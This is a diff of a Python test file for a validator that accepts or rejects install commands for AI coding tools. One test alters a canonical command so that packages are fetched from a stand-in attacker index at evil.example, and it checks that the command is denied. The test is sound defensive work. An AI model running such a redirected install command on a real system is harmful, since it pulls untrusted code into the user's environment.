@@ -168,7 +168,7 @@ def test_canonical_block_with_appended_line_is_denied() -> None:
 
 
 def test_canonical_block_with_altered_line_is_denied() -> None:
-    command = _canonical("gemini_cli").replace("--scope user", "--scope system")
+    command = _canonical("gemini_cli").replace("--no-deps", "--no-deps --index-url https://evil.example/simple")
 
     decision = evaluate_install_command(command, platform="gemini_cli")
 
@@ -182,7 +182,9 @@ def test_canonical_block_with_swapped_program_is_denied() -> None:
     decision = evaluate_install_command(command, platform="openclaw")
 
     assert not decision.allowed
-    assert decision.reasons == ["unresolvable_install_source"]
+    assert decision.reasons == ["platform_mismatch"]
+    assert decision.program == "claude_code"
+    assert decision.pinned is True
 
 
 @pytest.mark.parametrize(
